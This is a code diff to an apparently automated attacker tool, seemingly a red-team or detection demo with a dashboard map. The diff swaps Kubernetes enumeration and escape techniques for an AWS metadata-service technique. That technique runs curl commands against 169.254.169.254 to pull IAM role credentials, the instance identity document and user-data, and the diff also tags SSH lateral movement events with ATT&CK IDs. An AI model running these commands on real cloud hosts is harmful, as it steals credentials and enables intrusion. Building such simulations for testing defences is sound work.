@@ -8,7 +8,6 @@ import time
 from typing import TYPE_CHECKING
 
 from attacker.techniques.env_harvest import HARVEST_COMMANDS
-from attacker.techniques.k8s_attack import K8S_ENUM_COMMANDS, K8S_ESCAPE_COMMANDS
 from attacker.techniques.lateral_ssh import SSH_LATERAL_COMMANDS
 
 if TYPE_CHECKING:
@@ -16,8 +15,15 @@ if TYPE_CHECKING:
 
 # Map technique names to command lists
 TECHNIQUE_COMMANDS = {
-    "k8s_enum": K8S_ENUM_COMMANDS,
-    "k8s_escape": K8S_ESCAPE_COMMANDS,
+    "aws_metadata": [
+        "echo '=== AWS IMDS ABUSE (T1552.007) ==='",
+        "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null",
+        "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
+        "ROLE=$(curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); "
+        "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null",
+        "curl -sf --connect-timeout 3 http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null",
+        "curl -sf --connect-timeout 3 http://169.254.169.254/latest/user-data 2>/dev/null | head -50",
+    ],
     "ssh_lateral": SSH_LATERAL_COMMANDS,
     "cloud_api_enum": [
         "echo '=== CLOUD API ENUM ==='",
@@ -126,26 +132,19 @@ def exec_node(state: "AttackerState") -> "AttackerState":
 def _emit_network_event(state: "AttackerState", technique: str) -> None:
     """Emit network topology event for dashboard map."""
     events = {
-        "k8s_enum": {
+        "aws_metadata": {
             "source": state["target_ip"],
-            "target": "k8s-cluster",
-            "technique": "T1613",
-            "label": "K8s API enumeration",
+            "target": "169.254.169.254",
+            "technique": "T1552.007",
+            "label": "AWS IMDS credential access",
             "color": "orange",
-        },
-        "k8s_escape": {
-            "source": state["target_ip"],
-            "target": "k8s-host",
-            "technique": "T1610",
-            "label": "Privileged pod escape",
-            "color": "red",
         },
         "ssh_lateral": {
             "source": state["target_ip"],
             "target": state.get("victim2_ip", "10.4.60.41"),
             "technique": "T1021.004",
-            "label": "SSH lateral movement",
-            "color": "orange",
+            "label": "SSH lateral → Unmanaged",
+            "color": "red",
         },
         "cloud_api_enum": {
             "source": state["target_ip"],
